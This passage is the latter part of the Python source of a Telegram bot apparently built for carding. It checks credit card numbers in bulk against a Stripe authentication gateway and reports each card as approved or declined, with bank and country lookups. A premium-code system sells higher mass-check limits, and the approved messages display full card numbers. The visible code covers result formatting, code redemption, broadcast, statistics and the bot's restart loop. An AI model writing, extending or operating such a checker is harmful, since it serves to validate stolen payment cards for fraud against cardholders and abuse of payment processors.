𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅

𝗖𝗖 ⇾ `{cc_number}|{month}|{year}|{cvv}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Auth
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment added successfully

```
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ➜  {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')}
𝗕𝗮𝗻𝗸 ➜  {bin_info.get('bank', 'N/A')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜  {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}```

𝗧𝗼𝗼𝗸 {process_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
        """
    else:
        result_text = f"""
𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌

𝗖𝗮𝗿𝗱 ⇾ {cc_number}
𝗧𝘆𝗽𝗲 ⇾ {card_type}
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Auth
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {api_response[:100] + '...' if api_response and len(api_response) > 100 else api_response or 'Declined'}

```
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ➜  {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')}
𝗕𝗮𝗻𝗸 ➜  {bin_info.get('bank', 'N/A')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}```

𝗧𝗶𝗺𝗲 ⇾ {process_time} seconds
        """
    
    await processing_msg.edit_text(result_text, parse_mode='Markdown')

# [REST OF PREMIUM CODE FUNCTIONS REMAIN EXACTLY THE SAME...]
# Premium Code System
def generate_premium_code(days):
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT INTO premium_codes (code, days, created_at) VALUES (?, ?, ?)", (code, days, time.time()))
    conn.commit()
    conn.close()
    return code

async def code_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Owner command only!")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /code <days>")
        return
    try:
        days = int(context.args[0])
        code = generate_premium_code(days)
        await update.message.reply_text(f"""
💎 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗖𝗼𝗱𝗲 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱!
𝗖𝗼𝗱𝗲: `{code}`
𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {days} days
🔧 𝗨𝘀𝗮𝗴𝗲: /redeem {code}
        """, parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Invalid days format!")

async def redeem_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not await check_channel_membership(user_id, context):
        await update.message.reply_text("❌ Join our channel first!")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /redeem <code>")
        return
    code = context.args[0].upper()
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT days FROM premium_codes WHERE code=? AND used_by IS NULL", (code,))
    result = c.fetchone()
    if not result:
        await update.message.reply_text("❌ Invalid or already used code!")
        conn.close()
        return
    days = result[0]
    expires_at = time.time() + (days * 24 * 60 * 60)
    c.execute("UPDATE premium_codes SET used_by=? WHERE code=?", (user_id, code))
    c.execute("UPDATE users SET status='premium' WHERE user_id=?", (user_id,))
    c.execute("INSERT INTO redeemed (user_id, code, redeemed_at, expires_at) VALUES (?, ?, ?, ?)", (user_id, code, time.time(), expires_at))
    conn.commit()
    conn.close()
    expiry_date = datetime.fromtimestamp(expires_at).strftime("%Y-%m-%d %H:%M:%S")
    await update.message.reply_text(f"""
🎉 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲𝗱!
✅ You are now a Premium User!
📅 Expires: {expiry_date}
🔧 Features unlocked:
   • Mass check limit: {PREMIUM_LIMIT} CCs
   • Priority processing
💎 Thank you for supporting!
    """)

async def broadcast_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    message = ' '.join(context.args)
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    sent, failed = 0, 0
    for (user_id,) in users:
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            sent += 1
        except:
            failed += 1
        await asyncio.sleep(0.1)
    await update.message.reply_text(f"""
📢 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲!
✅ Sent: {sent}
❌ Failed: {failed}
    """)

async def stats_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE status='free'")
    free_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE status='premium'")
    premium_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM premium_codes WHERE used_by IS NOT NULL")
    used_codes = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM premium_codes WHERE used_by IS NULL")
    available_codes = c.fetchone()[0]
    conn.close()
    stats_text = f"""
📊 𝗕𝗼𝘁 𝗦𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀
👥 𝗨𝘀𝗲𝗿𝘀:
• Total Users: {total_users}
• Free Users: {free_users}
• Premium Users: {premium_users}
💎 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗦𝘆𝘀𝘁𝗲𝗺:
• Used Codes: {used_codes}
• Available Codes: {available_codes}
🔧 𝗟𝗶𝗺𝗶𝘁𝘀:
• Free: {FREE_LIMIT} CCs
• Premium: {PREMIUM_LIMIT} CCs
• Owner: {OWNER_LIMIT} CCs
    """
    await update.message.reply_text(stats_text)

# ERROR HANDLER
async def error_handler(update: Update, context: CallbackContext):
    """Handle errors gracefully"""
    logger.error(f"Exception while handling an update: {context.error}")
    
    try:
        # Notify owner about the error
        if OWNER_ID:
            error_msg = f"🚨 Bot Error:\n{context.error}"
            await context.bot.send_message(chat_id=OWNER_ID, text=error_msg)
    except:
        pass

def main():
    """Main function with auto-restart protection"""
    init_db()
    
    # Create application with error handler
    application = Application.builder().token(TOKEN).build()
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mtxt", mtxt_manual_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("code", code_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    # Add document handler for auto file detection
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Add custom message handler for dot commands
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_custom_commands))
    
    # Add callback handler for buttons
    application.add_handler(CallbackQueryHandler(handle_button))
    
    # Start the bot with auto-restart
    print("🤖 Bot is starting...")
    print("🎯 AUTO FILE DETECTION ACTIVATED!")
    print("🚀 Interactive Button Interface Ready!")
    print("💳 Full CC display in approved messages!")
    print("🛡️  Auto-restart protection enabled!")
    print("🔘 Vertical button layout implemented!")
    print("🛑 Military-grade stop system activated!")
    
    # Run with persistent polling
    while True:
        try:
            application.run_polling(
                drop_pending_updates=True,
                allowed_updates=Update.ALL_TYPES,
                timeout=30,
                pool_timeout=30
            )
        except Exception as e:
            logger.error(f"Bot crashed: {e}")
            print(f"🚨 Bot crashed: {e}")
            print("🔄 Restarting in 10 seconds...")
            time.sleep(10)
            print("🔄 Restarting bot now...")

if __name__ == '__main__':
    main()